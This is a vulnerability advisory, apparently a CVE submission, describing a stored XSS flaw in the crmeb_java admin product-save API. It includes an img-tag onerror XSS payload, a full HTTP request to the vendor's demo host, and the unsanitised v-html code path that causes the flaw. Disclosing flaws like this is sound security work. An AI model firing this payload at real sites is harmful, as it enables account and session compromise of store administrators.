| [Suggested description] Store XSS vulnerability exists in crmeb\_java <=1.3.4 Failure to filter or validate parameters effectively results in stored XSS.  [Vulnerability Type] Stored XSS  [Vendor of Product] <https://github.com/crmeb/crmeb_java>  [Affected Product Code Base] <=1.3.4  [Affected Component] /api/admin/store/product/save  [Attack Type] Remote  [Vulnerability details] payload :  ``` <img src=\"1111\" alt=\"2222\" width=\"33\" height=\"33\" onclick=\"alert`333`\" onerror=alert(2)/> ```  Get the request message of the /api/admin/store/product/save interface.  ``` POST /api/admin/store/product/save HTTP/2 Host: api.java.crmeb.net Content-Length: 1213 Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99" Accept: application/json, text/plain, */* Content-Type: application/json Authori-Zation: 213ff6ff1ca24ae78f8263bd7ad0ea6c Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Sec-Ch-Ua-Platform: "Windows" Origin: https://admin.java.crmeb.net Sec-Fetch-Site: same-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://admin.java.crmeb.net/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9  {"image":"https://api.java.crmeb.net/crmebimage/public/maintain/2023/03/13/9f83773cd1bf47118d6e02ad86b599520ay7shmx9i.jpg","sliderImages":["https://api.java.crmeb.net/crmebimage/public/maintain/2023/03/13/9f83773cd1bf47118d6e02ad86b599520ay7shmx9i.jpg"],"videoLink":"","sliderImage":"[\"https://api.java.crmeb.net/crmebimage/public/maintain/2023/03/13/9f83773cd1bf47118d6e02ad86b599520ay7shmx9i.jpg\"]","storeName":"3333","storeInfo":"2132131","keyword":"1111","cateIds":[972,1185],"cateId":"972,1185","unitName":"1111","sort":1,"giveIntegral":1,"ficti":2,"isShow":false,"isBenefit":false,"isNew":false,"isGood":false,"isHot":true,"isBest":false,"tempId":94,"attrValue":[{"image":"https://api.java.crmeb.net/crmebimage/public/maintain/2023/03/13/9f83773cd1bf47118d6e02ad86b599520ay7shmx9i.jpg","price":0,"cost":0,"otPrice":0,"stock":0,"barCode":"","weight":0,"volume":0,"attrValue":"{\"规格\":\"默认\"}"}],"attr":[{"attrName":"规格","attrValues":"默认","id":0}],"selectRule":"","isSub":false,"content":"111","specType":false,"id":0,"couponIds":[],"coupons":[],"activity":["默认","秒杀","砍价","拼团"]}  ```  The content parameter has a stored XSS vulnerability. Insert the payload and send the request packet. [crmeb_java_2_1](https://user-images.githubusercontent.com/97539349/225307167-c665a0a3-7343-4ac8-b011-209d5216296c.png) Find the added product and enter the product details page, click the inserted img tag to trigger the vulnerability. [crmeb_java_2_2](https://user-images.githubusercontent.com/97539349/225307645-3f460298-909f-4d24-a11c-dde76171898c.png) There you can see it!  [Impact Code execution] true  [Cause of vulnerability] com.zbkj.admin.controller.StoreProductController line 77. The save() method of storeProductService is called on line 77 of this controller [crmeb_java_2_3](https://user-images.githubusercontent.com/97539349/225310658-2736382a-5480-4e08-87f6-a4c5ccf99510.png) Follow up this method to com.zbkj.service.service.impl.StoreProductServiceImpl. On line 339, save the value of the content parameter in the request packet to the database. Come to the front page. In crmeb\_java\admin\src\views\store\creatStore\index.vue, in line 296, use v-html to render the obtained content value. It is known that v-html will treat the obtained content as HTML code to render. [crmeb_java_2_4](https://user-images.githubusercontent.com/97539349/225312601-7e4dccfe-e691-4b99-85d1-9aca9a2162e5.png) The reason for this vulnerability is that there is no legal security check on user data.  The end,thanks! |
